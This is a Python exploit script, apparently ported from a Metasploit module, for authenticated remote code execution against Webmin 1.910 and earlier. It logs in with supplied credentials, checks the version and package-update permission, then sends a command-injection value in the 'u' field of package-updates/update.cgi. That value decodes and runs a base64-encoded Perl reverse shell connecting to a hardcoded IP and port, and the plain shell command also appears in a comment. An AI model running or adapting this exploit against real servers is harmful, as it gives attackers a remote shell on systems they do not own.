#!/usr/bin/python
#Ported from the MSF Module 46984.rb
#Authored by payl0ad
#Webmin <= 1.910 Authenticated RCE

import sys
import requests
import argparse
import re

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def login(rhost,rport,username,password):
    url = "https://%s:%s/session_login.cgi" % (rhost, rport)
    cookies = {"testing": "1"}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"user": username, "pass": password}
    r = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)

    if r.status_code == 200 or r.status_code == 302:
        search = re.search('sid=(\w+)', str(r.request.headers))
        sid = search.group(0)
        print("Session cookie: %s" % (sid))

        if sid == "":
            print("Failed to retrieve cookie...")
            sys.exit(1)
        else:
            sid = sid.split('=')[1]
            execute(sid,rhost,rport)

def execute(sid,rhost,rport):
    url = "https://%s:%s/sysinfo.cgi?xnavigation=1" % (rhost, rport)
    cookies = {"sid": sid}
    r = requests.get(url, cookies=cookies, verify=False)

    if r.status_code == 200 or r.status_code == 302:
        #version = r.headers['Server'].split('/')[1]
        #version = float(version)
        version = r.text.split("=")[3]
        version = float(version.split(" ")[1])

        if version != "":
            print("Version is Webmin %s") % (version)

            if version <= 1.91:
                url = "https://%s:%s/package-updates/" % (rhost, rport)
                r = requests.get(url, cookies=cookies, verify=False)

                if re.search("Software Package Updates", r.text):
                    print("Target is VULNERBALE! and user has permissions to >>Package Update<<<")
                    exploit(rhost,rport,cookies,sid)
                else:
                    print("Target NOT vulnerable.  Try with another user.")
        else:
            print("Couldn't find version.  I'll continue, but might fail...")

    

def exploit(rhost,rport,cookies,sid):
    url = "https://%s:%s/package-updates/update.cgi" % (rhost, rport)
    cookies = {"redirect": "1", "testing": "1", "sid": str(sid)}
    referer = "https://%s:%s/package-updates/update.cgi?xnavigation=1" % (rhost, rport)
    headers = {"Referer": "", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    headers.update({'Referer': referer})

    #b64 encode // https://www.base64encode.org/
    #perl -e 'use Socket;$i="lhost";$p=lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    #url encode the b64 output // https://www.urlencoder.org/
    #cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMjI0IjskcD0xMDAwNTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn

    payload = "cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMjI0IjskcD0xMDAwNTtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI%2BJlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn"

    data = "mode=updates&search=&u=apt%2Fapt&u=%20%7C%20bash%20-c%20%22echo%20"+payload+"%7Cbase64%20-d%7Cbash%20-i%22&ok_top=Update+Selected+Packages"
    print("Sending payload %s" % data)
    requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)


def main():
    parser = argparse.ArgumentParser(description='Webmin 1.910 Authenticated RCE')
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int, help="target port", default=10000)
    parser.add_argument("-u", "--username", dest="username", type=str, help="username", required=True)
    parser.add_argument("-x", "--password", dest="password", type=str, help="password", required=True)
    options = parser.parse_args()
    login(options.rhost,options.rport,options.username,options.password)

if __name__ == '__main__':
    main()
